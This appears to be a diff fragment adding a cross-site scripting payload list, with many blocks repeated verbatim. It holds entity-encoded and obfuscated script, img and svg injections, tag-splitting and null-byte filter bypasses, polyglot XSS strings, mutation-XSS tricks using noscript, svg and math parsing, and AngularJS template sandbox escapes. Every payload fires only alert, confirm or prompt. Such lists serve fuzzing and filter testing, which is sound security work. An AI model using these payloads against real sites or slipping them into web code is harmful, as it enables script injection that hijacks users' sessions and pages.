+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(15)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(15)>
+<script>&#97;&#108;&#101;&#114;&#116;(16)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(16)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(16)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(16)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(16)>
+<script>&#97;&#108;&#101;&#114;&#116;(17)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(17)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(17)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(17)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(17)>
+<script>&#97;&#108;&#101;&#114;&#116;(18)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(18)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(18)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(18)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(18)>
+<script>&#97;&#108;&#101;&#114;&#116;(19)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(19)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(19)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(19)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(19)>
+<script>&#97;&#108;&#101;&#114;&#116;(20)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(20)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(20)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(20)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(20)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)<</script>/script>
+<script>al\u0065rt(1)</script>
+<script>eval("\x61lert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval("\x61lert(1)")>
+<svg onload=\u0061lert(1)>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+">'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<table><td background=javascript:alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<table><td background=javascript:alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<table><td background=javascript:alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<table><td background=javascript:alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<table><td background=javascript:alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<table><td background=javascript:alert(1)>
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$parent.constructor('alert(1)')()}}
+{{$root.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$parent.constructor('alert(1)')()}}
+{{$root.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$parent.constructor('alert(1)')()}}
+{{$root.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$parent.constructor('alert(1)')()}}
+{{$root.constructor('alert(1)')()}}
